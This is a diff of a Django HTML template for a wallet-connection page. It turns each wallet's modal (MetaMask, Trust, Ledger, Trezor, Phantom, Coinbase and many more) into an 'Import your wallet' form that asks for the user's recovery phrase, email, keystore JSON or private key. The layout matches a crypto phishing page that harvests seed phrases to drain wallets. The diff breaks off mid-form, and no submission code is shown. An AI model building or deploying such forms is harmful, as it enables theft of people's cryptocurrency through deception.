@@ -50,7 +50,7 @@
         <div class="wallet-section-subhead">▦ All Wallets</div>
 
         <div class="wallet-grid">
-            <button type="button" class="wallet-card selected" data-modal-open="exodusModal" data-category="popular">
+            <button type="button" class="wallet-card" data-modal-open="exodusModal" data-category="popular">
                 <span class="wallet-logo exodus"><img src="{% static 'app/image/Exodus_Wallet_Logo.png' %}"
                         alt="Exodus"></span>
                 <span class="wallet-name">Exodus</span>
@@ -181,533 +181,1113 @@
 <div class="modal fade wallet-modal" id="exodusModal" tabindex="-1" aria-labelledby="exodusModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+
+        <form class="modal-content">
+
             <div class="modal-header">
+
                 <span class="wallet-logo exodus wallet-modal-logo"><img
                         src="{% static 'app/image/Exodus_Wallet_Logo.png' %}" alt="Exodus"></span>
-                <h5 class="modal-title" id="exodusModalLabel">Exodus</h5>
+                <p class="modal-title" id="exodusModalLabel">
+                    Import your Exodus wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Exodus</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
+
             </div>
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>cancel</button>
+                <button type="submit" class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="trustModal" tabindex="-1" aria-labelledby="trustModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo trust wallet-modal-logo"><img src="{% static 'app/image/trust.png' %}"
                         alt="Trust"></span>
-                <h5 class="modal-title" id="trustModalLabel">Trust</h5>
+                <p class="modal-title" id="trustModalLabel">Import your Trust wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Trust</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
+
             </div>
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>cancel</button>
+                <button type="submit" class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="walletConnectModal" tabindex="-1" aria-labelledby="walletConnectModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo wallet-connect wallet-modal-logo"><img src="{% static 'app/image/icon.png' %}"
                         alt="Wallet Connect"></span>
-                <h5 class="modal-title" id="walletConnectModalLabel">Wallet Connect</h5>
+                <p class="modal-title" id="trustModalLabel">Import your Web3finance wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Wallet Connect</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="submit" class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="metamaskModal" tabindex="-1" aria-labelledby="metamaskModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo metamask wallet-modal-logo"><img src="{% static 'app/image/metamask.webp' %}"
                         alt="MetaMask"></span>
-                <h5 class="modal-title" id="metamaskModalLabel">MetaMask</h5>
+                <p class="modal-title" id="trustModalLabel">Import your Metamask wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">MetaMask</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="submit" class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="coinbaseModal" tabindex="-1" aria-labelledby="coinbaseModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo coinbase wallet-modal-logo"><img src="{% static 'app/image/WalletLogo.png' %}"
                         alt="Coinbase Wallet"></span>
-                <h5 class="modal-title" id="coinbaseModalLabel">Coinbase Wallet</h5>
+                <p class="modal-title" id="trustModalLabel">Import your Coinbase wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Coinbase Wallet</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="submit" class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="phantomModal" tabindex="-1" aria-labelledby="phantomModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo phantom wallet-modal-logo"><img src="{% static 'app/image/phantom.jpg' %}"
                         alt="Phantom"></span>
-                <h5 class="modal-title" id="phantomModalLabel">Phantom</h5>
+                <p class="modal-title" id="trustModalLabel">Import your Phantom wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Phantom</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="submit" class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
+
 <div class="modal fade wallet-modal" id="nanoModal" tabindex="-1" aria-labelledby="nanoModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo nano wallet-modal-logo"><img src="{% static 'app/image/nano.jpg' %}"
                         alt="Nano X Plus"></span>
-                <h5 class="modal-title" id="nanoModalLabel">Nano X Plus</h5>
+                <p class="modal-title" id="trustModalLabel">Import your Nano X plus wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Nano X Plus</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="submit" class="proceed">Proceeed</button>
+
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="tangemModal" tabindex="-1" aria-labelledby="tangemModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo tangem wallet-modal-logo"><img src="{% static 'app/image/tangem.png' %}"
                         alt="Tangent"></span>
-                <h5 class="modal-title" id="tangemModalLabel">Tangent</h5>
+                <p class="modal-title" id="trustModalLabel">Import your Tangent wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Tangent</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="submit" class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="arcModal" tabindex="-1" aria-labelledby="arcModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo arc wallet-modal-logo"><img src="{% static 'app/image/arculus.jpg' %}"
                         alt="Arculus"></span>
-                <h5 class="modal-title" id="arcModalLabel">Arculus</h5>
+                <p class="modal-title" id="trustModalLabel">Import your Arculus wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Arculus</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="submit" class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="trezorModal" tabindex="-1" aria-labelledby="trezorModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo trezor wallet-modal-logo"><img src="{% static 'app/image/trezor.png' %}"
                         alt="Trezor"></span>
-                <h5 class="modal-title" id="trezorModalLabel">Trezor</h5>
+                <p class="modal-title" id="trustModalLabel">Import your Trezor wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Trezor</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="submit" class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="ledgerModal" tabindex="-1" aria-labelledby="ledgerModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo ledger wallet-modal-logo"><img src="{% static 'app/image/ledger.png' %}"
                         alt="Ledger"></span>
-                <h5 class="modal-title" id="ledgerModalLabel">Ledger</h5>
+                <p class="modal-title" id="ledgerModalLabel">Import Your Ledger Wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Ledger</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="bitboxModal" tabindex="-1" aria-labelledby="bitboxModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo bitbox wallet-modal-logo"><img src="{% static 'app/image/bitbox.webp' %}"
                         alt="Bitbox02"></span>
-                <h5 class="modal-title" id="bitboxModalLabel">Bitbox02</h5>
+                <p class="modal-title" id="bitboxModalLabel">Import your Bitbox02 wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Bitbox02</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="xamanModal" tabindex="-1" aria-labelledby="xamanModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo xaman wallet-modal-logo"><img src="{% static 'app/image/xaman.png' %}"
                         alt="Xaman"></span>
-                <h5 class="modal-title" id="xamanModalLabel">Xaman</h5>
+                <p class="modal-title" id="xamanModalLabel">Import your Xaman wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Xaman</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
+
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="lobsterModal" tabindex="-1" aria-labelledby="lobsterModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo lobster wallet-modal-logo"><img src="{% static 'app/image/lobstr.png' %}"
                         alt="Lobstr"></span>
-                <h5 class="modal-title" id="lobsterModalLabel">Lobstr</h5>
+                <p class="modal-title" id="lobsterModalLabel">Import your Lobstr wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Lobstr</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
+
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="atomicModal" tabindex="-1" aria-labelledby="atomicModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo atomic wallet-modal-logo"><img src="{% static 'app/image/atomic.png' %}"
                         alt="Atomic"></span>
-                <h5 class="modal-title" id="atomicModalLabel">Atomic</h5>
+                <p class="modal-title" id="atomicModalLabel">Import your Atomic wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Atomic</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
+
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="rainbowModal" tabindex="-1" aria-labelledby="rainbowModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo rainbow wallet-modal-logo"><img src="{% static 'app/image/rainbow.png' %}"
                         alt="Rainbow"></span>
-                <h5 class="modal-title" id="rainbowModalLabel">Rainbow</h5>
+                <p class="modal-title" id="rainbowModalLabel">Import your Rainbow wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Rainbow</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="argentModal" tabindex="-1" aria-labelledby="argentModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo argent wallet-modal-logo"><img src="{% static 'app/image/argent.png' %}"
                         alt="Argent"></span>
-                <h5 class="modal-title" id="argentModalLabel">Argent</h5>
+                <p class="modal-title" id="argentModalLabel">Import your Argent wallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">Argent</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
+
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="safepalModal" tabindex="-1" aria-labelledby="safepalModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo safepal wallet-modal-logo"><img src="{% static 'app/image/safepal.png' %}"
                         alt="SafePal"></span>
-                <h5 class="modal-title" id="safepalModalLabel">SafePal</h5>
+                <p class="modal-title" id="safepalModalLabel">Import your SafePal</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">SafePal</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <label for="">Recovery Phrase</label>
+                    <div>
+                        <textarea name="phrase" id="phrase"
+                            placeholder="Enter your 12-24 word recovery phrase"></textarea>
+                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                    </div>
+                </div>
             </div>
             <div class="modal-footer">
-                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button>
+                <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
+                    class="proceed">Proceeed</button>
             </div>
-        </div>
+        </form>
     </div>
 </div>
 
 <div class="modal fade wallet-modal" id="myetherwalletModal" tabindex="-1" aria-labelledby="myetherwalletModalLabel"
     aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
-        <div class="modal-content">
+        <form class="modal-content">
             <div class="modal-header">
                 <span class="wallet-logo myetherwallet wallet-modal-logo"><img
                         src="{% static 'app/image/myether.png' %}" alt="MyEtherWallet"></span>
-                <h5 class="modal-title" id="myetherwalletModalLabel">MyEtherWallet</h5>
+                <p class="modal-title" id="myetherwalletModalLabel"> Import your MyEtherWallet</p>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
+            <div class="modal-header">
+                <button class="activebtn">Phrase</button>
+                <button>Keystore JSON</button>
+                <button>Private Key</button>
+            </div>
             <div class="modal-body">
-                <p class="wallet-step-text">MyEtherWallet</p>
+                <div class="phraseholder">
+                    <label for="wallet name">Wallet Name</label>
+                    <div>
+                        <input type="text" name="walletname" id="walletname" placeholder="Enter your wallet name">
+                    </div>
+                    <label for="">Email Address</label>
+                    <div>
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
